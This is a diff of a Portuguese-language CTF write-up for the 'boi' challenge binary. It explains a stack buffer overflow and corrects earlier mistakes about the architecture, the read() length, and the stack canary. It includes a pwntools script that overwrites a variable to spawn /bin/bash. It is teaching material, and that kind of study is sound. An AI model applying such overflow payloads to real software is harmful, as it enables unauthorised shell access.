@@ -29,9 +29,9 @@ $ file boi
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
 ```
 
-Veja que temos um arquivo em `x86`. Isso quer dizer que
+Veja que temos um arquivo `x86-64` (64 bits), `not stripped` (os nomes das funções estão disponíveis, então `disass main` funciona).
 
-Vejamos a main de um programa abaixo:
+Vejamos a `main` do programa (`disass main` no GDB):
 
 ```
 0x0000000000400641 <+0>:     push   rbp
@@ -78,7 +78,7 @@ Podemos ver que o programa verifica se a variável `rbp-0x1c` é igual a `0xcaf3
    0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
 ```
 
-Se esta condição for verdadeira, isso irá abrir uma shell, ou seja, o `run_cmd` nos permite executar comandos (se tivermos acesso a isso, obtemos acesso completo ao servidor onde o arquivo roda).
+Se esta condição for verdadeira, isso irá abrir uma shell: `run_cmd("/bin/bash")` (a string em `0x40077c`). Caso contrário, é chamado `run_cmd` com outra string (`0x400786`, que é um comando inofensivo). Se tivermos acesso a uma shell, obtemos acesso completo ao servidor onde o arquivo roda.
 
 Se verificarmos, a variável `rbp-0x1c` é inicializada antes com `0xdeadbeef`:
 
@@ -98,9 +98,11 @@ Porém, o problema é que a variável passada para o `read`, que lê o input e a
 
 Vemos que a variável passada como parâmetro é `rbp-0x30` (os registradores `rsi`, `rdi` são usados para passar argumentos para funções). Ou seja, esse é o input no qual colocamos uma string.
 
-A função `read` não possui limite de leitura, então podemos fazer um Buffer Overflow.
+O terceiro argumento do `read` (`edx`) é `0x18` = 24 bytes. Ou seja, o `read` lê até 24 bytes a partir de `rbp-0x30`, chegando até `rbp-0x18`. Isso é mais do que o espaço reservado para o input e passa por cima da variável em `rbp-0x1c`, então podemos fazer um Buffer Overflow (limitado, mas suficiente).
 
 Temos o input `rbp-0x30` e a variável que queremos sobrescrever em `rbp-0x1c`. Como `0x1c < 0x30`, a variável desejada está entre nosso input e o `rbp`, portanto podemos sobrescrever.
+
+Note também que o programa tem Stack Canary (`mov rax, QWORD PTR fs:0x28` / `mov QWORD PTR [rbp-0x8], rax` no início, e a verificação com `__stack_chk_fail` no fim). Isso não atrapalha aqui: só escrevemos até `rbp-0x18`, e o Canary está em `rbp-0x8`.
 
 A distância entre o input e a variável é `0x30-0x1c = 0x14 = 20`. Portanto, precisamos encher 20 casas com caracteres e depois colocar o que queremos. Vamos fazer isso com pwntools, em python: 
 
@@ -113,18 +115,18 @@ target = process('./boi')
 
 # Faz o payload
 # 0x14 bytes de dados quaisquer para encher o espaço entre
-# o início de nosso input e o início da variável alvo (inteiro)
-# 0x4 byte int we will overwrite target with
+# o início de nosso input e o início da variável alvo
+# + o inteiro de 4 bytes com que queremos sobrescrever a variável
 payload = b"0"*0x14 + p32(0xcaf3baee)
 
-# Send the payload
+# Envia o payload
 target.send(payload)
 
-# Drop to an interactive shell so we can interact with our shell
+# Abre o modo interativo para usarmos a shell
 target.interactive()
 ```
 
-Um ponto importante é que, como o arquivo está em `x86`, precisamos empacotar o valor `0xcaf3baee` para ocupar 4 bytes, além de deixar em little endian. A função `p32()` faz isto para nós.
+Um ponto importante é que a variável alvo é um `int` de 4 bytes (veja o `DWORD PTR [rbp-0x1c]` e o `cmp eax, ...`, que usa o registrador de 32 bits). Portanto, precisamos empacotar o valor `0xcaf3baee` em exatamente 4 bytes, em little endian: `ee ba f3 ca`. A função `p32()` faz isto para nós. Note que o binário ser de 64 bits não muda isso: o tamanho do empacotamento depende do tamanho da variável, e não da arquitetura.
 
 Quando rodamos o script...
 
